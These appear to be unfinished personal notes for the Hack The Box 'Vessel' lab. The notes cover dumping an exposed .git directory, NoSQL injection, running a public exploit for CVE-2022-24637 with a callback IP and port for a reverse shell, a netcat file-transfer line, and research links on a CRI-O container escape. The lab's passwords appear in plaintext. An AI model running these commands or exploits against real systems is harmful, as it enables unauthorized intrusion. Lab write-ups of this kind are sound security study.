# Vessel Helped-Through

Name: Vessel
Date:  
Difficulty:  Hard
Goals: 
- Terrible previous week come back with a vengence
- Exploit Dev
- Containers and namespace
Learnt:
Beyond Root:


Watching the first minute of Ippsec explain the awesomeness of this box and that it was CVE focused, but required you to write the exploits. I have decided that I will revisit this box once I have forgotten while leaving the  what I have done to be put to one side.  




































## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

vessel.htb

https://github.com/arthaud/git-dumper

Git contains compressed information about a repository including all previous versions.

```bash
git-dumper http://vessel.htb/dev/.git ./dev
```

![](usernameethanhtb.png)

![](passwordfordb.png)

` : daqvACHKvRn84VdVp`

![](returntooldversion.png)

![1080](sqlinjectdisc.png)


## NoSQL Exploit

Type checking problem [Stackhawk](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/)

![](nosql1.png)

![](nosql2.png)

![](nosql3.png)


## CVE Exploit 


http://openwebanalytics.vessel.htb/

![](openwebanalyticssearchsploit.png)

https://nvd.nist.gov/vuln/detail/CVE-2022-24637

![](sauceyversion.png)
https://www.exploit-db.com/exploits/51026

```bash
python3 51026.py -u admin -p 'admin' http://openwebanalytics.vessel.htb 10.10.14.102 6969
```

## Foothold

![](foothold.png)



## PrivEsc - through Steven to Ethan

```bash
nc $ip $port -w3 $files
```

https://medium.com/cassandra-cryptoassets/how-to-decompile-compiled-pyc-python-files-50e5f45d1edb
https://github.com/extremecoders-re/pyinstxtractor

![](screenshot.png)


https://github.com/rocky/python-uncompyle6/
https://pypi.org/project/PySide2/
```bash
pip install uncompyle6
pip3 install PySide2
```

![](extrxtthepyc.png)

Python2 
QRand from QtCore 

0-1000

Refering back screenshot.png 

Length is equal to 32

It is also pointed out it for Windows so the qrand

@n4nn4n0 : Did some testing with std::rand(1). Windows and Linux give different values, but clang and gcc are the same.

Windows machine setup incoming... along with completion of [[Sharp-Helped-Through]]

```bash
pdf2john
```

The problem is there is no entropy and same seed will produce the same outcome like minecraft. There are only a thousand

- Use the virtual environment to test code

To read the pdf
```bash
apt install Okular
```

## PrivEsc Ethan to Root

SETUIDs and `owauser : Vux8*ZF3rek94%N` for owa.
![](linpeaspinns.png)
https://fossies.org/linux/cri-o/pinns/src/pinns.c

https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
Warning: *"This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers"*


Reading about containerss and namespaces:
https://opensource.com/article/19/10/namespaces-and-containers-linux

[https://mkdev.me/posts/the-tool-that-really-runs-your-containers-deep-dive-into-runc-and-oci-specifications](https://mkdev.me/posts/the-tool-that-really-runs-your-containers-deep-dive-into-runc-and-oci-specifications)

Al ran into rootless issues... @paffet suggests: [https://github.com/opencontainers/runc/#rootless-containers](https://github.com/opencontainers/runc/#rootless-containers)

https://www.toptal.com/linux/separation-anxiety-isolating-your-system-with-linux-namespaces


[https://medium.com/@Mark.io/simple-rootless-containers-with-runc-on-centos-redhat-f9230f74b88b](https://medium.com/@Mark.io/simple-rootless-containers-with-runc-on-centos-redhat-f9230f74b88b)

[https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)

DeCruyssen points out: wrong pinns.c
https://github.com/cri-o/cri-o/blob/v1.19.0/pinns/src/pinns.c

Search Engine Dorking 
```
-"docker"
```

https://www.zend.com/blog/rootless-containers
https://opensource.com/article/19/5/shortcomings-rootless-containers

## Beyond Root


